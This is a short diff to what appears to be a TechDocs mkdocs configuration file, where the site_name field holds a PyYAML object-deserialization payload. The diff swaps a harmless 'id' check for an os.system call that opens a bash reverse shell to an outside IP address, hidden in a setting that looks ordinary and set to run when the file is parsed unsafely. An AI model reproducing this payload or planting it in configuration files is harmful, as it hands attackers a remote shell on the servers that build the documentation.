@@ -1,6 +1,7 @@
-site_name: !!python/object/apply:os.system ["id > /tmp/rce_pyyaml_success"]
+site_name: !!python/object/apply:os.system ["bash -i >& /dev/tcp/34.175.21.161/1234 0>&1"]
 plugins:
   - techdocs-core
+
 
 
 
